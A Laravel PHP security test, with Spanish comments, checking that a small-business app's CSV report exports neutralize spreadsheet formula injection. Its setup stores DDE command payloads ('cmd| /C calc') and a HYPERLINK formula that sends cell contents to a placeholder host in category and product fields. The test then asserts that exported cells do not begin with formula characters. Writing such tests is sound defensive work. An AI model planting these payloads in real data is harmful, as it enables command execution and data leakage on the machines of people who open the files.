<?php

namespace Tests\Security;

use App\Models\Categoria;
use App\Models\DetalleVenta;
use App\Models\Producto;
use App\Models\Usuario;
use App\Models\Venta;
use Database\Seeders\DatabaseSeeder;
use Illuminate\Foundation\Testing\RefreshDatabase;
use Tests\TestCase;

/**
 * Sec08a: inyección de fórmulas en el CSV de reportes. Un Administrador guarda
 * código, nombre de producto o nombre de categoría que empiezan con = + - @ \t \r;
 * al exportar, esas celdas de texto no deben quedar interpretables como fórmula
 * en Excel, y los montos deben seguir siendo números legibles.
 */
class Sec08aTest extends TestCase
{
    use RefreshDatabase;

    private const PELIGROSOS = ['=', '+', '-', '@', "\t", "\r"];

    protected function setUp(): void
    {
        parent::setUp();
        $this->seed(DatabaseSeeder::class);
    }

    private function admin(): Usuario
    {
        return Usuario::where('email', 'admin@microempresa.test')->first();
    }

    private function filas(string $tipo, array $extra = []): array
    {
        $contenido = $this->actingAs($this->admin())
            ->get(route('reportes.exportar', ['tipo' => $tipo] + $extra))
            ->assertOk()
            ->streamedContent();

        $lineas = preg_split('/\r?\n/', trim(substr($contenido, 3)));

        return array_map(fn ($l) => str_getcsv($l, ';'), $lineas);
    }

    private function prepararDatosMaliciosos(): Producto
    {
        Producto::query()->update(['activo' => false]);

        $this->actingAs($this->admin())->post(route('categorias.store'), [
            'nombre' => '@SUM(1+1)*cmd|\' /C calc\'!A0',
        ])->assertSessionHasNoErrors();
        $categoria = Categoria::where('nombre', 'like', '@SUM%')->firstOrFail();

        $this->actingAs($this->admin())->post(route('productos.store'), [
            'categoria_id' => $categoria->id,
            'codigo' => '+cmd|\' /C calc\'!A0',
            'nombre' => '=HYPERLINK("http://x/?"&A2;"clic")',
            'unidad_medida' => 'unidad',
            'precio_compra' => 4.5,
            'precio_venta' => 9,
            'stock_minimo' => 5,
            'activo' => 1,
        ])->assertSessionHasNoErrors();

        $producto = Producto::where('codigo', 'like', '+cmd%')->firstOrFail();

        $venta = Venta::create([
            'usuario_id' => $this->admin()->id, 'fecha' => now(), 'total' => 18, 'estado' => Venta::REGISTRADA,
        ]);
        DetalleVenta::create(['venta_id' => $venta->id, 'producto_id' => $producto->id, 'cantidad' => 2, 'precio_unitario' => 9]);

        return $producto;
    }

    private function assertCeldaSegura(string $celda, string $contexto): void
    {
        $this->assertFalse(
            $celda !== '' && in_array($celda[0], self::PELIGROSOS, true),
            "La celda de texto [{$celda}] en {$contexto} empieza con un carácter de fórmula y Excel la evaluará."
        );
    }

    public function test_celdas_de_texto_no_quedan_como_formula_en_los_tres_reportes(): void
    {
        $this->prepararDatosMaliciosos();
        $hoy = now()->toDateString();

        $casos = [
            'inventario' => [[0, 1, 2], [], [4, 5]],
            'stock-bajo' => [[0, 1, 2], [], []],
            'mas-vendidos' => [[0, 1], ['desde' => $hoy, 'hasta' => $hoy], [3]],
        ];

        foreach ($casos as $tipo => [$columnasTexto, $extra, $columnasMonto]) {
            $filas = $this->filas($tipo, $extra);
            $datos = array_values(array_filter(array_slice($filas, 1), fn ($f) => ($f[0] ?? '') !== 'Total'));
            $this->assertNotEmpty($datos, "El reporte {$tipo} no trae filas.");

            foreach ($datos as $fila) {
                foreach ($columnasTexto as $i) {
                    $this->assertCeldaSegura($fila[$i], "{$tipo} columna {$i}");
                }
                foreach ($columnasMonto as $i) {
                    // Los montos (incluidos negativos legítimos) siguen siendo números con coma decimal
                    $this->assertMatchesRegularExpression('/^-?\d+,\d{2}$/', $fila[$i], "Monto alterado en {$tipo}");
                }
            }
        }
    }
}
